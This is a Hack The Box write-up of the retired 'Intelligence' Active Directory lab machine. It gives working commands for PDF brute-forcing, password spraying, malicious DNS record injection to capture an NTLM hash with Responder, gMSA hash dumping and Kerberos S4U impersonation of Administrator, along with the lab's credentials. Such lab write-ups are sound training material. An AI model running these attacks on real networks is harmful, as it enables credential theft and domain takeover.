# Intelligence

| | |
|---|---|
| **Platform** | Hack The Box |
| **OS** | Windows |
| **Difficulty** | Medium |
| **IP Address** | 10.10.10.248 |
| **Status** | Retired |

## Overview
Intelligence is a medium-difficulty Windows Active Directory machine (domain `intelligence.htb`, DC `dc.intelligence.htb`). The web server hosts a set of predictably-named internal PDF "firmware/status" documents; downloading and parsing them for text and author metadata reveals both a default company password and a list of candidate usernames. Password spraying the default password against the derived username list yields a valid low-privileged account. A scheduled PowerShell script running as a privileged service account resolves hostnames from AD-integrated DNS and authenticates to them with its own credentials; abusing DNS record creation lets an attacker capture that account's NTLM hash via Responder. That account can read the password/hash of a group-managed service account (gMSA), which in turn holds delegation rights that are abused via a Kerberos S4U2Self/S4U2Proxy attack to impersonate the Administrator and read `root.txt`.

## Reconnaissance
`nmap -A` against `intelligence.htb` (10.10.10.248) confirmed a Windows Domain Controller:

```
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
389/tcp  open  ldap          Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
593/tcp  open  ncacn_http
636/tcp  open  ssl/ldap
3268/tcp open  ldap (Global Catalog)
3269/tcp open  ssl/ldap (Global Catalog)
```

The LDAP certificate confirmed the domain controller `dc.intelligence.htb` and the domain `intelligence.htb`, with SMB message signing enabled and required.

## Enumeration
The website on port 80 exposed a document portal at `/documents/` that served internal company files named with a predictable `YYYY-MM-DD-upload.pdf` pattern. A brute-force script (`files/getPDF.py`) iterated all plausible dates between 2020-2021 and downloaded every PDF that existed:

```python
url = 'http://intelligence.htb/documents/'
for i in range(2020, 2022):
    for j in range(1, 13):
        for k in range(1, 31):
            date = f'{i}-{j:02}-{k:02}-upload.pdf'
            r = requests.get(url + date)
            if r.status_code == 200:
                os.system(f'wget {url}{date} -O pdf/{date}')
```

Two lines of investigation followed:
1. **Metadata extraction**: running `exiftool` against every PDF (`files/exifPDF.py`) revealed the **author** field of several documents, disclosing employee names such as `William.Lee` and `Jose.Williams`. These were expanded into a username wordlist (first-initial+lastname permutations) and validated with `kerbrute userenum`, confirming `Administrator@intelligence.htb` and `William.Lee@intelligence.htb` as valid AD accounts.
2. **Content extraction**: parsing PDF body text with `pdfminer` (`files/getPasswords.py`) surfaced a "Welcome to Intelligence Corp!" onboarding document containing the organization's default password:
   ```
   NewIntelligenceCorpUser9876
   ```

Password-spraying this default password against the harvested usernames located a valid, still-unchanged account:

```
intelligence.htb\Tiffany.Molina : NewIntelligenceCorpUser9876
```

This provided SMB/domain authentication and access to `user.txt`.

## Foothold
With authenticated access to the domain, a scheduled task/script was discovered running as a privileged service account. The script (recovered locally as `files/downdetector.ps1`) periodically enumerates DNS records under the AD-integrated zone matching a `web*` naming pattern and sends an authenticated HTTP request to each host to check availability:

```powershell
# Check web server status. Scheduled to run every 5min
Import-Module ActiveDirectory
foreach ($record in Get-ChildItem "AD:DC=intelligence.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=intelligence,DC=htb" | Where-Object Name -like "web*") {
    try {
        $request = Invoke-WebRequest -Uri "http://$($record.Name)" -UseDefaultCredentials
        if ($request.StatusCode -ne 200) {
            Send-MailMessage -From 'Ted Graves <Ted.Graves@intelligence.htb>' -To 'Ted Graves <Ted.Graves@intelligence.htb>' -Subject "Host: $($record.Name) is down"
        }
    } catch {}
}
```

Because `Tiffany.Molina` had rights to create new DNS records in the zone, a malicious record was added pointing a `web*`-matching hostname at the attacker's IP, using `dnstool.py` from the `krbrelayx` toolkit:

```
python3 dnstool.py -u 'intelligence.htb\Tiffany.Molina' -p 'NewIntelligenceCorpUser9876' \
  -a add -r 'webrsff.intelligence.htb' -d 10.10.14.80 10.10.10.248
```

With **Responder** listening on the attacker's tun0 interface, the scheduled script's next run resolved the new record and authenticated (via `UseDefaultCredentials`) to the attacker's HTTP listener, leaking an NTLMv2 handshake for the privileged account `Ted.Graves`:

```
[HTTP] NTLMv2 Username : intelligence\Ted.Graves
[HTTP] NTLMv2 Hash     : Ted.Graves::intelligence:...
```

The captured hash was cracked offline, recovering the plaintext password `Mr.Teddy` for `Ted.Graves`.

## Privilege Escalation
`Ted.Graves` had read access to a group-managed service account's (gMSA) password blob. Using `gMSADumper.py`:

```
python3 gMSADumper.py -u 'Ted.Graves' -p 'Mr.Teddy' -d 'intelligence.htb' -l 'dc.intelligence.htb'
```

This dumped the NT hash of the gMSA account `svc_int$`:

```
svc_int$:::5e47bac787e5e1970cf9acdb5b316239
```

`svc_int$` was configured with resource-based/constrained delegation rights to the DC's `WWW` service, enabling a Kerberos S4U2Self/S4U2Proxy impersonation attack to request a service ticket impersonating the Administrator:

```
getST.py intelligence.htb/svc_int$ -spn WWW/dc.intelligence.htb \
  -hashes :5e47bac787e5e1970cf9acdb5b316239 -impersonate Administrator
```

(A Kerberos clock-skew error encountered here was resolved by syncing the attacking machine's clock to the DC with `ntpdate`.) The resulting `Administrator.ccache` ticket was loaded via `KRB5CCNAME` and used to authenticate with Impacket's `smbclient.py` using Kerberos auth (`-k -no-pass`), granting full SMB access as `Administrator` and allowing retrieval of `root.txt` from the Administrator's desktop.

## Lessons Learned
- Predictable file-naming schemes for "internal only" documents are trivially brute-forced; sensitive data should never rely on obscurity of a URL pattern.
- Document metadata (EXIF/author fields) and body text routinely leak usernames and default credentials: sanitize documents before publishing them, even internally.
- Default/unrotated onboarding passwords are a common initial-access vector once any valid username list exists (password spraying).
- Any AD account with DNS record-creation rights over an AD-integrated zone can be abused to redirect a service's authenticated requests (via `UseDefaultCredentials`) to an attacker-controlled listener, resulting in NTLM relay/capture: DNS write permissions should be tightly scoped.
- Group-managed service accounts (gMSAs) with delegation configured are a powerful escalation primitive once their credential material is exposed to a compromised principal.

## Tools & References
- `nmap`, `enum4linux` for AD/service enumeration.
- `getPDF.py`, `exifPDF.py`, `getPasswords.py` (kept in `files/`): custom scripts to brute-force, download, and mine the internal PDF documents for metadata/credentials (the latter uses the `pdfminer.six` library: `https://github.com/pdfminer/pdfminer.six`).
- `kerbrute` for AD username validation.
- `downdetector.ps1` (kept in `files/`): the recovered scheduled PowerShell script whose DNS-driven web-check behavior was abused for credential capture.
- `dnstool.py` from **krbrelayx** (`https://github.com/dirkjanm/krbrelayx`) for adding a malicious DNS record.
- **Responder** for capturing the relayed NTLMv2 handshake.
- `gMSADumper.py` (`https://github.com/micahvandeusen/gMSADumper`) for reading the gMSA `svc_int$` credential.
- Impacket's `getST.py` and `smbclient.py` for the Kerberos S4U impersonation attack and final Administrator access.
- **Omitted from repository** (large/bulk supporting evidence, findings fully described above):
  - `Files/` (~2.2 MB, ~90+ downloaded `YYYY-MM-DD-upload.pdf` documents): the raw internal PDF corpus mined for metadata/credentials; the extraction scripts and recovered secrets are documented above.
  - `pdfminer/` (~19.9 MB cloned git repository): the third-party PDF text-extraction library used by `getPasswords.py`. Upstream: `https://github.com/pdfminer/pdfminer.six`.
